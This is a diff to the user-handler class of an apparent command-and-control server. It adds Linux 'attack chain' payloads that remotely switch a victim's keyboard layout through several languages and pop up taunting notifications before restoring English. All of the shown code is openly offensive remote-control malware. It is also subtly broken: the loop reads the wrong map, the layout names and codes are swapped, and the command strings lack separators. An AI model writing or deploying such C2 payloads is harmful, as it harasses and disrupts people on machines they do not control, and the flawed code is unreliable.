@@ -406,8 +406,8 @@ public class C2ServerUserHandler implements Runnable{
                     linuxCommands += "notify-send 'Have Fun Learning French MF'";
                     linuxCommands += "sleep 60;";
                     linuxCommands += "notify-send 'Ok you can have English Again'";
-                    linuxCommands += "setxkbmap en;";
-                    // TODO Figure out how to mess with Linux Keyboard
+                    linuxCommands += "setxkbmap us;";
+                    
                 } else if (userAttackChainChoice.equals("3")){
                     // Change their Keybaord language every 30 seconds
 
@@ -429,7 +429,20 @@ public class C2ServerUserHandler implements Runnable{
                     windowsCommands += "Set-WinUserLanguageList en-US -force;";
 
                     // Linux
+                    HashMap<String, String> languagesLin = new HashMap<>();
                     linuxCommands = "";
+                    languagesLin.put("French", "fr");
+                    languagesLin.put("German", "de");
+                    languagesLin.put("Arabic", "sy");
+                    languagesLin.put("Chinese", "cn");
+                    languagesLin.put("Italian","it");
+                    for(String language : languages.keySet()){
+                        linuxCommands += "setxkbmap " + language + ";";
+                        linuxCommands += "notify-send 'Have Fun Learning " + languagesLin.get(language) + " MF'";
+                        linuxCommands += "sleep 60;";
+                    }
+                    linuxCommands += "notify-send 'Ok you can have English Again'";
+                    linuxCommands += "setxkbmap en;";
                     // TODO Figure out how to mess with Linux Keyboard
                 } else if (userAttackChainChoice.equals("4")){
                     // Change it back to english in case we mess up
@@ -442,6 +455,8 @@ public class C2ServerUserHandler implements Runnable{
 
                     // Linux
                     linuxCommands = "";
+                    linuxCommands += "notify-send 'Sorry about that here's english'";
+                    linuxCommands += "setxkbmap en;";
                     // TODO Figure out how to mess with Linux Keyboard
                 } else if (userAttackChainChoice.equals("5")){
                     // Send a message box
